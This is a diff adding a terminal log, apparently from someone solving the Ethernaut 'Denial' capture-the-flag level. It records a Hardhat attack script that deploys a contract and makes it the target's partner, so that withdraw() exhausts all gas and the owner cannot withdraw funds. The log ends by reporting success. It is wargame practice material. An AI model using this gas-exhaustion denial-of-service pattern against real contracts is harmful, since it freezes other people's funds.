@@ -1,0 +1,22 @@
+PS C:\VScode\web3\77-ethernaut-denial> npx hardhat run .\scripts\attackDenial.ts --network opS
+Downloading compiler 0.8.0
+Warning: Return value of low-level calls not used.
+  --> contracts/Denial.sol:19:9:
+   |
+19 |         partner.call{value: amountToSend}("");
+   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+
+Compiled 2 Solidity files successfully (evm target: istanbul).
+開始執行 Denial 合約攻擊腳本...
+目標 Denial 合約地址: 0xBBa23DbF343d46966D990dc7245577D3681ba12B
+使用賬戶: 0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6
+正在部署攻擊合約...
+攻擊合約已部署到地址: 0x371104dAC80B716B85DB3ee17f64c1435752DB79
+正在執行攻擊...
+攻擊已完成！
+攻擊合約已被設置為 Denial 合約的 partner
+當 owner 嘗試調用 withdraw() 時，所有 gas 將被消耗完畢
+這將導致交易失敗，owner 無法提取資金
+攻擊成功！
+PS C:\VScode\web3\77-ethernaut-denial>
